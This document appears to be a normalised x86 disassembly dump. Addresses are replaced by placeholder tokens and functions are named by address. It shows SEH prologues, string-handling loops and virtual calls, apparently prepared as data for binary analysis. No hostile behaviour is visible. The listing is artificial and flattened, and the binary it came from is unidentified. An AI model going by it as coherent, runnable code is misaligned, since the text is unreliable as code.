mov [ ebp - 0x24 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x28 ] eax
cmp [ edi + 0x70 ] ebx
je r-xdata
cmp [ edi + 0x70 ] ebx
jne r-xdata
mov edi [ ebp - 0x20 ]
mov edi [ ebp - 0x10 ]
push r--data
push edi
call sub_403fa5
call sub_40f2a9
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
push ebx
mov esi edi
mov [ ebp - 0x4 ] 0x2
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
push edi
call sub_403fa5
lea esi [ ebp - 0x28 ]
call sub_40f2a9
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
push ebx
mov esi edi
mov [ ebp - 0x4 ] 0x3
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
push edi
call sub_403fa5
lea esi [ ebp - 0x28 ]
call sub_408d54
mov edi [ ebp - 0x20 ]
jmp r-xdata
cmp eax ebx
je r-xdata
push r--data
push [ ebp - 0x10 ]
call sub_403fa5
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x58 ]
mov [ ebp - 0x18 ] eax
push r--data
mov eax [ edi + 0x18 ]
mov [ ebp - 0x4c ] eax
mov eax [ edi + 0x4 ]
lea edi [ ebp - 0x50 ]
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x50 ] eax
call sub_41ea56
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_425e4c
retn 0x4
mov esi [ ebp - 0x10 ]
push r--data
push esi
call sub_403fa5
sub esp 0x1c
add edi 0x3c
mov ecx esp
mov [ ebp - 0x14 ] esp
push edi
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x6
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
push esi
call sub_403fa5
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push [ ebp - 0x1c ]
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x7
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
push esi
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
call sub_403fa5
mov esi [ ebp - 0x10 ]
push r--data
push esi
call sub_403fa5
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x14 ] esp
push [ ebp - 0x1c ]
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x5
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
jmp r-xdata
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x48 ]
push edx
call [ eax + 0x4 ]
push 0xffffffff
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x10 ]
push ebx
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
push [ ebp - 0x10 ]
jmp r-xdata
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
sub_41f281
push 0x8
mov eax sub_43a826
call sub_425dad
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
cmp [ ebp + 0x20 ] edi
jbe r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push eax
call sub_403de3
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_40415f
mov eax [ ebp - 0x14 ]
call sub_425e4c
retn
xor ebx ebx
lea eax [ ebp + 0xc ]
call sub_403eaa
imul ebx ebx 0x1c
mov [ eax ] 0x26
lea eax [ ebx + rw-data ]
push eax
inc edi
lea esi [ ebp + 0xc ]
call sub_42019a
mov eax [ ebx + rw-data ]
add [ ebp - 0x10 ] eax
mov edi [ ebp - 0x10 ]
inc ebx
cmp ebx 0x5
jb r-xdata
lea eax [ ebp + 0xc ]
call sub_403eaa
mov al [ eax ]
cmp al [ ebx + r--data ]
je r-xdata
jmp r-xdata
inc edi
mov [ ebp - 0x10 ] edi
cmp edi [ ebp + 0x20 ]
jb r-xdata
sub_41f313
push 0x10
mov eax sub_43abb2
call sub_425dad
mov eax [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esi
cmp eax esi
jbe r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ ebp + 0xc ]
push eax
call sub_403de3
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_40415f
mov eax [ ebp - 0x1c ]
call sub_425e4c
retn
mov edi esi
lea eax [ ebp + 0xc ]
call sub_403eaa
cmp [ eax ] 0x26
jne r-xdata
inc esi
cmp esi [ ebp - 0x14 ]
jb r-xdata
xor ebx ebx
and [ ebp - 0x18 ] ebx
mov edi rw-data
xor ebx ebx
cmp [ ebp - 0x10 ] ebx
je r-xdata
add [ ebp - 0x18 ] 0x1c
inc ebx
add edi 0x1c
cmp [ ebp - 0x18 ] 0x24c
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
and [ ebp - 0x10 ] ebx
mov eax [ edi + 0x10 ]
lea ecx [ eax + esi ]
cmp ecx [ ebp - 0x14 ]
ja r-xdata
jmp r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov edi ebx
lea eax [ ebp + 0xc ]
call sub_403eaa
cmp [ eax ] 0x0
jne r-xdata
push eax
push edx
lea eax [ ecx + esi + 0x1 ]
push eax
call sub_424b04
add esp 0xc
test eax eax
je r-xdata
lea ecx [ ebp + 0x10 ]
cmp [ ebp + 0x24 ] 0x10
mov ecx [ ebp + 0x10 ]
jae r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp + 0xc ]
call sub_403eaa
cmp [ eax ] 0x0
je r-xdata
cmp ebx [ ebp + 0x20 ]
ja r-xdata
inc ebx
mov edi [ ebp - 0x10 ]
lea eax [ ebp + 0xc ]
call sub_403eaa
mov esi eax
mov edi ebx
lea eax [ ebp + 0xc ]
call sub_403eaa
mov cl [ esi ]
mov [ eax ] cl
lea edi [ ebx + 0x1 ]
lea eax [ ebp + 0xc ]
call sub_403eaa
mov [ eax ] 0x0
mov edi esi
lea eax [ ebp + 0xc ]
call sub_403eaa
mov cl [ ebx + r--data ]
imul ebx ebx 0x1c
mov [ eax ] cl
xor eax eax
inc eax
lea ebx [ ebx + rw-data ]
mov [ ebp - 0x10 ] eax
cmp [ ebx ] eax
jb r-xdata
sub ebx [ ebp + 0x20 ]
push 0x0
lea edi [ ebp + 0xc ]
call sub_403fc6
push 0xffffffff
push ebx
lea ecx [ ebp + 0xc ]
call sub_4043e3
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea esi [ esi + eax - 0x1 ]
mov eax [ ebp - 0x10 ]
lea edi [ esi + eax ]
lea eax [ ebp + 0xc ]
call sub_403eaa
inc [ ebp - 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x10 ]
cmp eax [ ebx ]
jbe r-xdata
sub_41f493
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b8c3
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc0 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ edx + 0x14 ] eax
je r-xdata
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
cmp [ edx + 0x14 ] eax
je r-xdata
lea ebx [ ecx + 0x4 ]
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x24 ] eax
mov eax [ ebx ]
mov [ esp + 0x20 ] eax
mov edi [ esp + 0x18 ]
cmp [ edi + 0x7c ] 0x0
je r-xdata
mov eax [ esp + 0x18 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push [ ebp + 0xc ]
call sub_403de3
lea eax [ esp + 0x84 ]
push eax
call sub_41f313
add esp 0x20
mov esi eax
mov [ esp + 0xc8 ] 0x2
or [ esp + 0x10 ] 0x4
jmp r-xdata
mov edi [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ esp + 0x4c ]
push eax
call sub_41f313
add esp 0x20
mov edi eax
and [ esp + 0xc8 ] 0x0
or [ esp + 0x10 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ esp + 0x68 ]
push eax
call sub_41f313
add esp 0x20
mov [ esp + 0xc8 ] 0x3
or [ esp + 0x10 ] 0x8
jmp r-xdata
cmp [ edi + 0x7c ] 0x0
je r-xdata
cmp [ esp + 0x17 ] 0x0
jne r-xdata
and [ esp + 0x10 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ esp + 0x38 ]
call sub_40415f
lea esi [ esp + 0x20 ]
call sub_40f2a9
mov ecx edi
call sub_40561a
or [ esp + 0xc8 ] 0xffffffff
test [ esp + 0x10 ] 0x1
mov [ esp + 0x17 ] al
je r-xdata
test [ esp + 0x10 ] 0x4
je r-xdata
and [ esp + 0x10 ] 0xfffffff7
push esi
push edi
lea ecx [ esp + 0x54 ]
call sub_40415f
push esi
push eax
lea eax [ esp + 0x8c ]
push eax
call sub_4105ee
mov [ esp + 0xc8 ] 0x4
mov edx [ ebx + 0x14 ]
mov esi [ ebx ]
push edx
push esi
mov ecx eax
mov edi ebx
call sub_418ef0
xor esi esi
xor edi edi
push esi
inc edi
push edi
lea ecx [ esp + 0xa8 ]
call sub_40415f
push esi
push edi
lea ecx [ esp + 0x8c ]
call sub_40415f
test [ esp + 0x10 ] 0x8
je r-xdata
mov eax [ esp + 0x18 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
lea esi [ esp + 0x20 ]
call sub_408d54
jmp r-xdata
push esi
push edi
lea ecx [ esp + 0x70 ]
mov edi [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push [ ebp + 0xc ]
call sub_403de3
lea eax [ esp + 0x4c ]
push eax
call sub_41f313
add esp 0x20
mov edi eax
mov [ esp + 0xc8 ] 0x1
or [ esp + 0x10 ] 0x2
jmp r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp + 0x2c ] eax
mov eax [ ebx ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x20 ]
mov [ esp + 0x28 ] eax
call sub_41ea56
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x38 ]
jmp r-xdata
lea esi [ esp + 0x20 ]
call sub_40f2a9
push 0xffffffff
add eax 0x1c
push 0x0
push edi
mov ecx eax
call sub_40400a
test [ esp + 0x10 ] 0x2
je r-xdata
call sub_40415f
sub_41f717
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43ec43
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa4
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0xb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esp + 0x2c ]
push eax
call sub_408d83
push [ ebp + 0xc ]
and [ esp + 0xbc ] 0x0
lea eax [ esp + 0x30 ]
push eax
call sub_408a3e
lea ecx [ esp + 0x10 ]
lea eax [ esp + 0x2c ]
call sub_408e2c
push eax
mov [ esp + 0xbc ] 0x1
mov edx [ esi ]
push edi
mov ecx esi
call [ edx + 0x10 ]
push 0x0
push 0x1
lea ecx [ esp + 0x18 ]
call sub_40415f
or [ esp + 0xb8 ] 0xffffffff
lea eax [ esp + 0x2c ]
call sub_408986
sub_41f7c5
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43ec43
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa4
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0xb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esp + 0x2c ]
push eax
call sub_408d83
push [ ebp + 0xc ]
and [ esp + 0xbc ] 0x0
lea eax [ esp + 0x30 ]
push eax
call sub_420095
lea ecx [ esp + 0x10 ]
lea eax [ esp + 0x2c ]
call sub_408e2c
push eax
mov [ esp + 0xbc ] 0x1
mov edx [ esi ]
push edi
mov ecx esi
call [ edx + 0x10 ]
push 0x0
push 0x1
lea ecx [ esp + 0x18 ]
call sub_40415f
or [ esp + 0xb8 ] 0xffffffff
lea eax [ esp + 0x2c ]
call sub_408986
sub_41f873
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
lea eax [ esp + 0xc ]
push eax
lea eax [ esi + 0x58 ]
call sub_420181
mov [ edi + 0x74 ] esi
sub_41f894
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ ecx ]
push edi
call [ eax + 0x64 ]
mov edi eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ esi + 0x58 ]
mov [ ebp + 0x8 ] edi
call sub_420181
mov [ edi + 0x74 ] esi
pop edi
sub_41f8c1
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b81e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
and [ esp + 0x18 ] 0x0
mov eax [ ebx + 0x18 ]
mov eax [ eax ]
mov [ esp + 0x24 ] eax
mov eax [ ebx + 0x4 ]
mov [ esp + 0x20 ] eax
mov esi [ ebp + 0x8 ]
call sub_403dae
mov eax esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x38 ] esp
push [ ebp + 0xc ]
call sub_403de3
lea eax [ esp + 0x4c ]
push eax
call sub_41f313
add esp 0x20
mov edi eax
and [ esp + 0x58 ] 0x0
or [ esp + 0x18 ] 0x1
jmp r-xdata
cmp [ esp + 0x17 ] 0x0
lea esi [ esp + 0x20 ]
jne r-xdata
and [ esp + 0x18 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ esp + 0x38 ]
call sub_40415f
lea esi [ esp + 0x20 ]
call sub_40f2a9
mov ecx edi
call sub_40561a
or [ esp + 0x58 ] 0xffffffff
test [ esp + 0x18 ] 0x1
mov [ esp + 0x17 ] al
je r-xdata
call sub_40f2a9
mov ecx [ ebp + 0x8 ]
add eax 0x1c
push eax
call sub_403de3
mov eax [ ebp + 0x8 ]
jmp r-xdata
call sub_408d54
jmp r-xdata
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov [ esp + 0x2c ] eax
mov eax [ ebx + 0x4 ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x20 ]
mov [ esp + 0x28 ] eax
call sub_41ea56
test al al
je r-xdata
sub_41f9d8
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b7ea
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
and [ esp + 0x18 ] 0x0
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ecx + 0x18 ]
mov eax [ eax ]
mov [ esp + 0x28 ] eax
mov eax [ ecx + 0x4 ]
xor ebx ebx
mov [ esp + 0x24 ] eax
inc ebx
mov al 0x1
jmp r-xdata
xor al al
mov eax [ esp + 0x1c ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x3c ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ esp + 0x6c ]
push eax
call sub_41f313
add esp 0x20
mov edi eax
and [ esp + 0x78 ] 0x0
or [ esp + 0x18 ] ebx
jmp r-xdata
mov [ esp + 0x17 ] 0x0
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
lea esi [ esp + 0x24 ]
call sub_40f2a9
mov ecx edi
call sub_40561a
test al al
je r-xdata
or [ esp + 0x78 ] 0xffffffff
test [ esp + 0x18 ] bl
je r-xdata
and [ esp + 0x18 ] 0xfffffffd
push 0x0
push ebx
lea ecx [ esp + 0x3c ]
call sub_40415f
mov [ esp + 0x17 ] bl
jmp r-xdata
mov ecx [ esp + 0x1c ]
cmp [ ecx + 0x7c ] 0x0
je r-xdata
cmp [ esp + 0x17 ] 0x0
jne r-xdata
and [ esp + 0x18 ] 0xfffffffe
push 0x0
push ebx
lea ecx [ esp + 0x58 ]
call sub_40415f
test [ esp + 0x18 ] 0x2
je r-xdata
mov edi eax
sub esp 0x1c
mov ecx esp
mov [ esp + 0x3c ] esp
push eax
call sub_403de3
lea eax [ esp + 0x50 ]
push eax
call sub_41f313
add esp 0x20
mov edi eax
mov [ esp + 0x78 ] ebx
or [ esp + 0x18 ] 0x2
jmp r-xdata
mov al bl
jmp r-xdata
lea esi [ esp + 0x24 ]
call sub_408d54
mov ecx [ esp + 0x1c ]
jmp r-xdata
lea esi [ esp + 0x24 ]
call sub_40f2a9
add eax 0x1c
mov ecx edi
call sub_40561a
test al al
je r-xdata
mov eax [ ecx + 0x18 ]
mov [ esp + 0x30 ] eax
mov eax [ ecx + 0x4 ]
lea edi [ esp + 0x2c ]
lea esi [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
call sub_41ea56
test al al
je r-xdata
sub_41fb67
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b79d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi ecx
and [ esp + 0x10 ] 0x0
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x58 ]
mov [ esp + 0x18 ] eax
call sub_423d5c
cmp [ esp + 0x18 ] eax
je r-xdata
xor bl bl
cmp [ edi + 0x7c ] 0x0
je r-xdata
cmp [ esp + 0x1c ] esi
je r-xdata
test bl bl
je r-xdata
and [ esp + 0x10 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ esp + 0x28 ]
call sub_40415f
mov ebx [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ esp + 0x3c ]
push eax
call sub_41f313
add esp 0x20
mov ebx eax
and [ esp + 0x48 ] 0x0
or [ esp + 0x10 ] 0x1
jmp r-xdata
cmp [ esp + 0x18 ] 0x0
mov esi [ edi + 0x6c ]
mov edi [ edi + 0x58 ]
je r-xdata
lea esi [ esp + 0x18 ]
call sub_408d54
jmp r-xdata
mov bl 0x1
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx ebx
call sub_40561a
test al al
jne r-xdata
call sub_423d5c
cmp [ esp + 0x18 ] edi
je r-xdata
cmp [ esp + 0x18 ] 0x0
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
je r-xdata
or [ esp + 0x48 ] 0xffffffff
test [ esp + 0x10 ] 0x1
je r-xdata
xor eax eax
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov eax [ eax ]
jmp r-xdata
cmp [ esp + 0x1c ] esi
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fc90
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b79d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
and [ esp + 0x10 ] 0x0
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x58 ]
mov [ esp + 0x18 ] eax
call sub_423d5c
cmp [ esp + 0x18 ] eax
je r-xdata
xor bl bl
cmp [ edi + 0x7c ] 0x0
je r-xdata
cmp [ esp + 0x1c ] esi
je r-xdata
test bl bl
je r-xdata
and [ esp + 0x10 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ esp + 0x28 ]
call sub_40415f
mov ebx [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ esp + 0x3c ]
push eax
call sub_41f313
add esp 0x20
mov ebx eax
and [ esp + 0x48 ] 0x0
or [ esp + 0x10 ] 0x1
jmp r-xdata
cmp [ esp + 0x18 ] 0x0
mov esi [ edi + 0x6c ]
mov edi [ edi + 0x58 ]
je r-xdata
lea esi [ esp + 0x18 ]
call sub_408d54
jmp r-xdata
mov bl 0x1
jmp r-xdata
call sub_40f2a9
push [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x44 ]
test al al
jne r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx ebx
call sub_40561a
test al al
je r-xdata
call sub_423d5c
cmp [ esp + 0x18 ] edi
je r-xdata
cmp [ esp + 0x18 ] 0x0
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
je r-xdata
or [ esp + 0x48 ] 0xffffffff
test [ esp + 0x10 ] 0x1
je r-xdata
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov eax [ eax ]
jmp r-xdata
cmp [ esp + 0x1c ] esi
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41fddc
push 0x4c
mov eax sub_43b769
call sub_425dad
mov edi ecx
and [ ebp - 0x14 ] 0x0
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x58 ]
mov [ ebp - 0x20 ] eax
call sub_423d5c
cmp [ ebp - 0x20 ] eax
je r-xdata
xor bl bl
cmp [ edi + 0x7c ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x14 ] 0x1
je r-xdata
and [ ebp - 0x14 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_40415f
mov ebx [ ebp + 0x8 ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push [ ebp + 0x8 ]
call sub_403de3
lea eax [ ebp - 0x58 ]
push eax
call sub_41f313
add esp 0x20
mov ebx eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x14 ] 0x1
jmp r-xdata
test bl bl
je r-xdata
and [ ebp - 0x14 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_40415f
mov bl 0x1
jmp r-xdata
mov ebx [ ebp + 0xc ]
cmp [ ebx + 0x14 ] 0x0
je r-xdata
lea esi [ ebp - 0x20 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x28 ]
mov ecx ebx
call sub_40561a
test al al
je r-xdata
cmp [ ebp - 0x20 ] 0x0
mov esi [ edi + 0x6c ]
mov edi [ edi + 0x58 ]
je r-xdata
lea esi [ ebp - 0x20 ]
call sub_408d54
jmp r-xdata
test [ ebp - 0x14 ] 0x2
je r-xdata
cmp [ edi + 0x7c ] 0x0
je r-xdata
call sub_423d5c
cmp [ ebp - 0x20 ] edi
je r-xdata
cmp [ ebp - 0x20 ] 0x0
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
je r-xdata
lea esi [ ebp - 0x20 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x2c ]
mov ecx ebx
call sub_40561a
test al al
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push ebx
call sub_403de3
lea eax [ ebp - 0x3c ]
push eax
call sub_41f313
add esp 0x20
mov ebx eax
mov [ ebp - 0x4 ] 0x1
or [ ebp - 0x14 ] 0x2
xor eax eax
cmp [ ebp - 0x1c ] esi
setne al
call sub_425e4c
retn 0x8
sub_41ff23
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov ebx [ edi + 0x58 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ebx
call sub_423d5c
cmp ebx eax
je r-xdata
mov esi [ edi + 0x6c ]
mov edi [ edi + 0x58 ]
test ebx ebx
je r-xdata
lea esi [ esp + 0x10 ]
call sub_40f2a9
push [ ebp + 0xc ]
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x44 ]
test al al
jne r-xdata
cmp [ esp + 0x14 ] esi
je r-xdata
call sub_423d5c
cmp ebx edi
je r-xdata
call sub_408d54
mov ebx [ esp + 0x10 ]
jmp r-xdata
xor eax eax
lea esi [ esp + 0x10 ]
call sub_40f2a9
mov eax [ eax ]
jmp r-xdata
cmp [ esp + 0x14 ] esi
je r-xdata
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ffb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43c9bd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
xor ebx ebx
mov [ esp + 0x28 ] ebx
cmp eax ebx
je r-xdata
or [ esp + 0x28 ] 0xffffffff
lea eax [ edi + 0x4 ]
lea ecx [ ebx + 0x4 ]
call sub_41e91d
mov eax [ edi + 0x78 ]
mov [ ebx + 0x78 ] eax
mov eax [ edi + 0x6c ]
mov eax [ eax ]
mov [ esp + 0x18 ] eax
mov eax [ edi + 0x58 ]
mov [ esp + 0x14 ] eax
movzx eax [ edi + 0x7c ]
push eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x2c ]
push eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
push eax
push [ esp + 0x20 ]
call sub_41ec78
mov ebx eax
call sub_423d5c
cmp [ esp + 0x14 ] eax
je r-xdata
mov eax ebx
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
